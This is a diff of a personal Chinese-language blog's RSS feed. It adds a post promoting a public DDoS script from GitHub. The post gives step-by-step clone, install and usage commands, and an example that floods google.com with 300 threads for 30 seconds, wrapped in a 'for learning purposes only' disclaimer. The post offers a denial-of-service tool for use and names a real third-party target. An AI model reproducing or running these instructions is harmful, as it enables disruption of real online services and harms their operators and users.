@@ -1,2 +1,34 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>上尉的博客</title><link>http://blog.thebag.us.kg</link><description>This my first blog</description><copyright>上尉的博客</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/179188651?s=400&amp;u=c1ac34a4384ba8e0066b0a61d7dfdcac966d8039&amp;v=4</url><title>avatar</title><link>http://blog.thebag.us.kg</link></image><lastBuildDate>Fri, 23 Aug 2024 07:00:57 +0000</lastBuildDate><managingEditor>上尉的博客</managingEditor><ttl>60</ttl><webMaster>上尉的博客</webMaster><item><title>This is my blog.</title><link>http://blog.thebag.us.kg/post/This%20is%20my%20blog..html</link><guid isPermaLink="true">http://blog.thebag.us.kg/post/This%20is%20my%20blog..html</guid><pubDate>Fri, 23 Aug 2024 05:25:20 +0000</pubDate></item></channel></rss>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>上尉的博客</title><link>http://blog.thebag.us.kg</link><description>This my first blog</description><copyright>上尉的博客</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/179188651?s=400&amp;u=c1ac34a4384ba8e0066b0a61d7dfdcac966d8039&amp;v=4</url><title>avatar</title><link>http://blog.thebag.us.kg</link></image><lastBuildDate>Sat, 24 Aug 2024 02:48:34 +0000</lastBuildDate><managingEditor>上尉的博客</managingEditor><ttl>60</ttl><webMaster>上尉的博客</webMaster><item><title>简单好用的DDOS脚本</title><link>http://blog.thebag.us.kg/post/jian-dan-hao-yong-de-DDOS-jiao-ben.html</link><description>## **项目地址**&#13;
+[https://github.com/HyukIsBack/KARMA-DDoS](url)&#13;
+&#13;
+&gt; [!CAUTION 警告]&#13;
+&gt; Resources are for learning purposes only 资源仅供学习使用&#13;
+&#13;
+## **安装项目**&#13;
+_1. 克隆项目_&#13;
+```shell&#13;
+git clone https://github.com/HyukIsBack/KARMA-DDoS&#13;
+```&#13;
+_2.打开项目_&#13;
+```shell&#13;
+cd KARMA-DDoS&#13;
+```&#13;
+_3.安装依赖_&#13;
+```shell&#13;
+python3 setup.py&#13;
+```&#13;
+&#13;
+## **使用方法**&#13;
+_1. 命令行_&#13;
+```c&#13;
+python3 main.py &lt;攻击方式&gt; &lt;目标&gt; &lt;攻击线程&gt; &lt;攻击时间(秒)&gt;&#13;
+```&#13;
+_2.例子_&#13;
+```python&#13;
+python3 main.py soc https://google.com 300 30&#13;
+##使用 soc攻击方式 攻击google.com 使用300个线程 持续30秒##&#13;
+```&#13;
+&#13;
+&gt; [!CAUTION 警告]&#13;
+&gt; Resources are for learning purposes only 资源仅供学习使用。</description><guid isPermaLink="true">http://blog.thebag.us.kg/post/jian-dan-hao-yong-de-DDOS-jiao-ben.html</guid><pubDate>Sat, 24 Aug 2024 02:48:09 +0000</pubDate></item><item><title>This is my blog.</title><link>http://blog.thebag.us.kg/post/This%20is%20my%20blog..html</link><guid isPermaLink="true">http://blog.thebag.us.kg/post/This%20is%20my%20blog..html</guid><pubDate>Fri, 23 Aug 2024 05:25:20 +0000</pubDate></item></channel></rss>
